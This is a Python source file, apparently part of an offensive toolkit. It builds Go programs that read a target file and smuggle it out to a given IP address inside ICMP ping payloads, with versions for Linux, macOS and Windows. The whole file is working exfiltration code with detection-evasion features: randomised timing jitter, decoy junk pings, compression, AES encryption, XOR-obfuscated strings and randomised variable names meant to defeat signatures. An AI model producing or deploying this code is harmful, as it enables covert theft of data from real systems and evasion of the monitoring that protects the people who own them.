import random

from ..obfuscation import xor_key, xor_encode


def _go_payload(file_path, ip, period, random_delay, target_os, randomize=False, junk=0, randomize_junk=False, compress=False, encrypt=None, passphrase='', estimate=False, obfuscate_strings=False):
    go_file = file_path.replace("\\", "\\\\").replace('"', '\\"')

    imports = ['"crypto/sha256"', '"encoding/hex"', '"fmt"', '"math"', 'mrand "math/rand"', '"os"', '"time"']
    if target_os in ("linux", "macos"):
        imports.append('"os/exec"')
    if target_os == "windows":
        imports.extend(['"syscall"', '"unsafe"'])
    if compress:
        imports.append('"bytes"')
    if compress:
        imports.append('"compress/gzip"')
    if encrypt:
        imports.extend(['"crypto/aes"', '"crypto/cipher"', '"crypto/hmac"'])
    if junk > 0 or encrypt:
        imports.append('crand "crypto/rand"')
    imports = sorted(set(imports))
    import_block = "\n".join("\t" + imp for imp in imports)

    if target_os == "linux":
        helpers = """
func sendPing(ip, pat string, sz, timeout int) bool {
\tcmd := exec.Command("ping", "-c", "1", "-W", fmt.Sprintf("%d", timeout), "-s", fmt.Sprintf("%d", sz), "-p", pat, ip)
\tcmd.Stdout = nil
\tcmd.Stderr = nil
\treturn cmd.Run() == nil
}
"""
    elif target_os == "macos":
        helpers = """
func sendPing(ip, pat string, sz, timeout int) bool {
\tcmd := exec.Command("ping", "-c", "1", "-W", fmt.Sprintf("%d", timeout*1000), "-s", fmt.Sprintf("%d", sz), "-p", pat, ip)
\tcmd.Stdout = nil
\tcmd.Stderr = nil
\treturn cmd.Run() == nil
}
"""
    else:
        helpers = """
var (
\tdl1 = syscall.NewLazyDLL("iphlpapi.dll")
\tdl2 = syscall.NewLazyDLL("ws2_32.dll")
\tpcf = dl1.NewProc("IcmpCreateFile")
\tpse = dl1.NewProc("IcmpSendEcho")
\tpch = dl1.NewProc("IcmpCloseHandle")
\tpia = dl2.NewProc("inet_addr")
)

func sendPing(ip, pat string, sz, timeout int) bool {
\tpb, _ := hex.DecodeString(pat)
\tipb, _ := syscall.BytePtrFromString(ip)
\tad, _, _ := pia.Call(uintptr(unsafe.Pointer(ipb)))
\tif ad == 0xffffffff {
\t\treturn false
\t}
\thd, _, _ := pcf.Call()
\tif hd == 0 || hd == ^uintptr(0) {
\t\treturn false
\t}
\tdefer pch.Call(hd)
\trb := make([]byte, 256+len(pb))
\trt, _, _ := pse.Call(hd, ad, uintptr(unsafe.Pointer(&pb[0])), uintptr(len(pb)), 0, uintptr(unsafe.Pointer(&rb[0])), uintptr(len(rb)), uintptr(timeout*1000))
\treturn rt > 0
}
"""

    if encrypt:
        helpers += """
func kdf(pw, sa []byte, it, dl int) []byte {
\tnb := (dl + 31) / 32
\tdk := make([]byte, 0, nb*32)
\tfor bi := 1; bi <= nb; bi++ {
\t\tmc := hmac.New(sha256.New, pw)
\t\tmc.Write(sa)
\t\tmc.Write([]byte{byte(bi >> 24), byte(bi >> 16), byte(bi >> 8), byte(bi)})
\t\tui := mc.Sum(nil)
\t\tti := make([]byte, 32)
\t\tcopy(ti, ui)
\t\tfor ji := 1; ji < it; ji++ {
\t\t\tmc = hmac.New(sha256.New, pw)
\t\t\tmc.Write(ui)
\t\t\tui = mc.Sum(nil)
\t\t\tfor ki := range ti {
\t\t\t\tti[ki] ^= ui[ki]
\t\t\t}
\t\t}
\t\tdk = append(dk, ti...)
\t}
\treturn dk[:dl]
}
"""

    template = """package main

import (
__IMPORTS__
)
__HELPERS__
func main() {
\tf := "__FILE__"
\tip := "__IP__"
\tp := __PERIOD__
\trd := __RDELAY__
\tc := 12
\tib := 3
\tr := 5
\tt := 2
\tdata, err := os.ReadFile(f)
\tif err != nil {
\t\tfmt.Fprintf(os.Stderr, "[-] Cannot read file: %v\\n", err)
\t\tos.Exit(1)
\t}
\thv := sha256.Sum256(data)
\thsh := hex.EncodeToString(hv[:])
\thx := hex.EncodeToString(data)
\tdsz := len(data)
\ttot := int(math.Ceil(float64(dsz) / float64(c)))
\tif tot > 1<<(8*ib) {
\t\tfmt.Fprintln(os.Stderr, "[-] File too large")
\t\tos.Exit(1)
\t}
\tif rd != 0 {
\t\tfmt.Fprintf(os.Stdout, "[+] Sending '%s' (%d bytes) to '%s' in %d pings every (%g +- %g) s\\n", f, dsz, ip, tot, p, rd)
\t} else if p != 0 {
\t\tfmt.Fprintf(os.Stdout, "[+] Sending '%s' (%d bytes) to '%s' in %d pings every %g s\\n", f, dsz, ip, tot, p)
\t} else {
\t\tfmt.Fprintf(os.Stdout, "[+] Sending '%s' (%d bytes) to '%s' in %d pings\\n", f, dsz, ip, tot)
\t}
\tif rd > p {
\t\tfmt.Fprintf(os.Stderr, "[!] WARNING: random-delay (%g s) > period (%g s)\\n", rd, p)
\t}
\tls := false
\tt0 := time.Now()
\tfor i := 0; i < tot; i++ {
\t\tidx := fmt.Sprintf("%06x", i)
\t\tst := i * 24
\t\ten := st + 24
\t\tif en > len(hx) {
\t\t\ten = len(hx)
\t\t}
\t\tchunk := hx[st:en]
\t\tpat := idx + chunk
\t\tok := false
\t\tfor a := 0; a < r; a++ {
\t\t\tif ls {
\t\t\t\tif rd != 0 {
\t\t\t\t\tsl := p + (mrand.Float64()*2-1)*rd
\t\t\t\t\tif sl < 0 {
\t\t\t\t\t\tsl = 0
\t\t\t\t\t}
\t\t\t\t\ttime.Sleep(time.Duration(sl * float64(time.Second)))
\t\t\t\t} else if p != 0 {
\t\t\t\t\ttime.Sleep(time.Duration(p * float64(time.Second)))
\t\t\t\t}
\t\t\t}
\t\t\tls = true
\t\t\tsz := len(pat) / 2
\t\t\tif sendPing(ip, pat, sz, t) {
\t\t\t\tok = true
\t\t\t\tbreak
\t\t\t}
\t\t}
\t\tif !ok {
\t\t\tfmt.Fprintf(os.Stderr, "[-] No reply for ping %d, transfer aborted\\n", i)
\t\t\tos.Exit(1)
\t\t}
\t\tsn := i + 1
\t\tif p != 0 || rd != 0 {
\t\t\tel := time.Since(t0).Seconds()
\t\t\teh := int(el) / 3600
\t\t\tem := int(el) % 3600 / 60
\t\t\tes := int(el) % 60
\t\t\tby := sn * c
\t\t\tif by > dsz {
\t\t\t\tby = dsz
\t\t\t}
\t\t\tpct := 100 * sn / tot
\t\t\tfmt.Fprintf(os.Stdout, "\\r  %d/%d pings, %d/%d bytes, %d%%, elapsed %02d:%02d:%02d", sn, tot, by, dsz, pct, eh, em, es)
\t\t\tif rd == 0 && sn > 0 {
\t\t\t\trm := int(el * float64(tot-sn) / float64(sn))
\t\t\t\trh := rm / 3600
\t\t\t\trmm := rm % 3600 / 60
\t\t\t\trss := rm % 60
\t\t\t\tfmt.Fprintf(os.Stdout, ", remaining ~%02d:%02d:%02d", rh, rmm, rss)
\t\t\t}
\t\t} else if sn%100 == 0 {
\t\t\tfmt.Fprintf(os.Stdout, "  %d/%d\\n", sn, tot)
\t\t}
\t}
\tfmt.Fprintln(os.Stdout)
\tfmt.Fprintln(os.Stdout, "==================================================")
\tfmt.Fprintln(os.Stdout, "                     DONE")
\tfmt.Fprintln(os.Stdout, "==================================================")
\tfmt.Fprintln(os.Stdout)
\tfmt.Fprintf(os.Stdout, "[*] SHA-256: %s\\n", hsh)
}
"""

    key = None
    if obfuscate_strings:
        key = xor_key()
        key_str = ','.join(str(b) for b in key)
        helpers += (
            '\nfunc _d(h string, k []byte) string {\n'
            '\tb, _ := hex.DecodeString(h)\n'
            '\tfor i := range b {\n'
            '\t\tb[i] ^= k[i%len(k)]\n'
            '\t}\n'
            '\treturn string(b)\n'
            '}\n'
        )

    script = template.replace('__IMPORTS__', import_block).replace('__HELPERS__', helpers)

    if obfuscate_strings:
        script = script.replace(
            '\tf := "__FILE__"\n\tip := "__IP__"',
            f'\t_k := []byte{{{key_str}}}\n\tf := _d("__XFILE__", _k)\n\tip := _d("__XIP__", _k)'
        )

    if compress:
        compress_code = (
            "\tosz := len(data)\n"
            "\tvar cbuf bytes.Buffer\n"
            "\tgw := gzip.NewWriter(&cbuf)\n"
            "\tgw.Write(data)\n"
            "\tgw.Close()\n"
            "\tdata = cbuf.Bytes()\n"
            "\tcsz := len(data)\n"
            "\tfmt.Fprintf(os.Stdout, \"[*] Compressed: %d -> %d bytes (%.1f%%)\\n\", osz, csz, 100.0*float64(csz)/float64(osz))\n"
        )
        script = script.replace(
            "\thx := hex.EncodeToString(data)\n",
            compress_code + "\thx := hex.EncodeToString(data)\n"
        )

    if encrypt:
        go_pass = passphrase.replace("\\", "\\\\").replace('"', '\\"')
        cipher_parts = encrypt.split('-')
        key_size = int(cipher_parts[1]) // 8
        cipher_mode = cipher_parts[2] if len(cipher_parts) > 2 else 'cbc'
        encrypt_code = (
            "\tpp := \"__PP_VALUE__\"\n"
            "\tesl := make([]byte, 8)\n"
            "\tcrand.Read(esl)\n"
            f"\tedk := kdf([]byte(pp), esl, 10000, {key_size + 16})\n"
        )
        if cipher_mode == 'cbc':
            encrypt_code += (
                "\tepd := 16 - len(data)%16\n"
                "\tfor epi := 0; epi < epd; epi++ {\n"
                "\t\tdata = append(data, byte(epd))\n"
                "\t}\n"
            )
        encrypt_code += f"\tebl, _ := aes.NewCipher(edk[:{key_size}])\n"
        if cipher_mode == 'cbc':
            encrypt_code += f"\temo := cipher.NewCBCEncrypter(ebl, edk[{key_size}:])\n"
            encrypt_code += "\tect := make([]byte, len(data))\n"
            encrypt_code += "\temo.CryptBlocks(ect, data)\n"
        elif cipher_mode == 'cfb':
            encrypt_code += f"\temo := cipher.NewCFBEncrypter(ebl, edk[{key_size}:])\n"
            encrypt_code += "\tect := make([]byte, len(data))\n"
            encrypt_code += "\temo.XORKeyStream(ect, data)\n"
        elif cipher_mode == 'ofb':
            encrypt_code += f"\temo := cipher.NewOFB(ebl, edk[{key_size}:])\n"
            encrypt_code += "\tect := make([]byte, len(data))\n"
            encrypt_code += "\temo.XORKeyStream(ect, data)\n"
        elif cipher_mode == 'ctr':
            encrypt_code += f"\temo := cipher.NewCTR(ebl, edk[{key_size}:])\n"
            encrypt_code += "\tect := make([]byte, len(data))\n"
            encrypt_code += "\temo.XORKeyStream(ect, data)\n"
        encrypt_code += (
            "\tdata = append(append([]byte(\"Salted__\"), esl...), ect...)\n"
            "\tfmt.Fprintln(os.Stdout, \"[*] Encrypted with " + encrypt + "\")\n"
        )
        if obfuscate_strings:
            encrypt_code = encrypt_code.replace(
                '\tpp := "__PP_VALUE__"\n',
                '\tpp := _d("__XPP__", _k)\n'
            )
        script = script.replace(
            "\thx := hex.EncodeToString(data)\n",
            encrypt_code + "\thx := hex.EncodeToString(data)\n"
        )

    if junk > 0:
        script = script.replace(
            "\tc := 12\n",
            f"\tc := 12\n\tJ := {junk}\n"
        )
        if randomize_junk:
            junk_data = "\t\t\tjb := make([]byte, 14)\n\t\t\tcrand.Read(jb)\n\t\t\tjd := \"ff\" + hex.EncodeToString(jb)\n"
        else:
            junk_data = "\t\t\tjb := make([]byte, 12)\n\t\t\tcrand.Read(jb)\n\t\t\tjd := \"ffffff\" + hex.EncodeToString(jb)\n"
        junk_code = (
            "\t\tfor j := 0; j < J; j++ {\n" +
            junk_data +
            "\t\t\tif ls {\n"
            "\t\t\t\tif rd != 0 {\n"
            "\t\t\t\t\tsl := p + (mrand.Float64()*2-1)*rd\n"
            "\t\t\t\t\tif sl < 0 {\n"
            "\t\t\t\t\t\tsl = 0\n"
            "\t\t\t\t\t}\n"
            "\t\t\t\t\ttime.Sleep(time.Duration(sl * float64(time.Second)))\n"
            "\t\t\t\t} else if p != 0 {\n"
            "\t\t\t\t\ttime.Sleep(time.Duration(p * float64(time.Second)))\n"
            "\t\t\t\t}\n"
            "\t\t\t}\n"
            "\t\t\tls = true\n"
            "\t\t\tsendPing(ip, jd, 15, t)\n"
            "\t\t}\n"
        )
        script = script.replace("\t\tsn := i + 1\n", "\t\tsn := i + 1\n" + junk_code)

    if estimate:
        est_lines = (
            "\tfmt.Fprintln(os.Stdout, \"[!] ESTIMATE OPTION ENABLED — the file will NOT be transferred\")\n"
            "\tfmt.Fprintf(os.Stdout, \"[*] File size (after processing): %d bytes\\n\", dsz)\n"
            "\tfmt.Fprintf(os.Stdout, \"[*] Data pings: %d\\n\", tot)\n"
        )
        if junk > 0:
            est_lines += (
                "\tfmt.Fprintf(os.Stdout, \"[*] Junk pings: %d\\n\", tot*J)\n"
                "\tfmt.Fprintf(os.Stdout, \"[*] Total pings: %d\\n\", tot*(1+J))\n"
            )
            total_expr = "float64(tot*(1+J))"
        else:
            est_lines += "\tfmt.Fprintf(os.Stdout, \"[*] Total pings: %d\\n\", tot)\n"
            total_expr = "float64(tot)"
        est_lines += (
            "\tif p != 0 {\n"
            "\t\tet := " + total_expr + " * p\n"
            "\t\th := int(et) / 3600\n"
            "\t\tm := int(et) % 3600 / 60\n"
            "\t\tss := int(et) % 60\n"
            "\t\tfmt.Fprintf(os.Stdout, \"[*] Estimated time: ~%02d:%02d:%02d\\n\", h, m, ss)\n"
            "\t}\n"
            "\tfmt.Fprintf(os.Stdout, \"[*] SHA-256: %s\\n\", hsh)\n"
            "\tos.Exit(0)\n"
        )
        script = script.replace(
            "\tls := false\n\tt0 := time.Now()\n",
            est_lines + "\tls := false\n\tt0 := time.Now()\n"
        )

    if randomize:
        import re
        var_names = [
            'sendPing', 'timeout',
            'f', 'ip', 'p', 'rd',
            'c', 'ib', 'r', 't',
            'data', 'err', 'hv', 'hsh', 'hx', 'dsz', 'tot',
            'ls', 't0',
            'i', 'idx', 'st', 'en', 'chunk', 'pat', 'ok',
            'a', 'sl', 'sz', 'sn',
            'el', 'eh', 'em', 'es', 'by', 'pct',
            'rm', 'rh', 'rmm', 'rss',
        ]
        if target_os in ("linux", "macos"):
            var_names.append('cmd')
        if target_os == "windows":
            var_names.extend(['dl1', 'dl2', 'pcf', 'pse', 'pch', 'pia', 'pb', 'ipb', 'ad', 'hd', 'rb', 'rt'])
        if compress:
            var_names.extend(['osz', 'csz', 'cbuf', 'gw'])
        if encrypt:
            var_names.extend(['pp', 'kdf', 'esl', 'edk', 'ebl', 'emo', 'ect'])
            if cipher_mode == 'cbc':
                var_names.append('epd')
        if junk > 0:
            var_names.extend(['J', 'j', 'jb', 'jd'])
        if estimate:
            var_names.extend(['et', 'h', 'm', 'ss'])
        if obfuscate_strings:
            var_names.extend(['_d', '_k'])
        letters = 'abcdefghijklmnopqrstuvwxyz'
        alphanums = letters + '0123456789'
        go_reserved = {'for', 'var', 'map', 'int', 'len', 'cap', 'new', 'nil', 'fmt', 'hex', 'net'}
        original_names = set(var_names)
        used = set()
        mapping = {}
        for name in var_names:
            while True:
                rand_name = random.choice(letters) + ''.join(random.choices(alphanums, k=2))
                if rand_name not in used and rand_name not in go_reserved and rand_name not in original_names:
                    used.add(rand_name)
                    mapping[name] = rand_name
                    break
        for old_name in sorted(var_names, key=len, reverse=True):
            if len(old_name) == 1:
                pattern = r'(?<![-\\%])\b' + re.escape(old_name) + r'\b'
            else:
                pattern = r'\b' + re.escape(old_name) + r'\b'
            script = re.sub(pattern, mapping[old_name], script)

    period_str = f"{period:g}"
    if '.' not in period_str and 'e' not in period_str.lower():
        period_str += '.0'
    rdelay_str = f"{random_delay:g}"
    if '.' not in rdelay_str and 'e' not in rdelay_str.lower():
        rdelay_str += '.0'

    if obfuscate_strings:
        script = (script
                  .replace('__XFILE__', xor_encode(file_path, key))
                  .replace('__XIP__', xor_encode(ip, key))
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__XPP__', xor_encode(passphrase, key))
    else:
        script = (script
                  .replace('__FILE__', go_file)
                  .replace('__IP__', ip)
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__PP_VALUE__', go_pass)

    return script
